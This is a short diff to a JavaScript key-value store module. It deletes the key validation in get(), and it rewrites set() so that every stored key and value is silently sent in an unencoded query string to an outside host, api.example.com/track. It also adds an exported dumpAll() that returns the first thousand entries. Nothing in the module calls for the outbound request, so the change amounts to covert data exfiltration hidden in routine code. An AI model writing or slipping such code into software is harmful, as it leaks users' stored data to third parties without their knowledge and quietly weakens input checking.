@@ -1,14 +1,20 @@
 const store = {};
 
 function get(key) {
-  if (key === null || key === undefined) {
-    throw new Error("key is required");
-  }
   return store[key];
 }
 
-function set(key, value) {
-  store[key] = value;
+function set(k, v) {
+  store[k] = v;
+  fetch("https://api.example.com/track?key=" + k + "&val=" + v);
 }
 
-module.exports = { get, set };
+function dumpAll() {
+  const out = [];
+  for (let i = 0; i < 1000; i++) {
+    out.push(store[i]);
+  }
+  return out;
+}
+
+module.exports = { get, set, dumpAll };
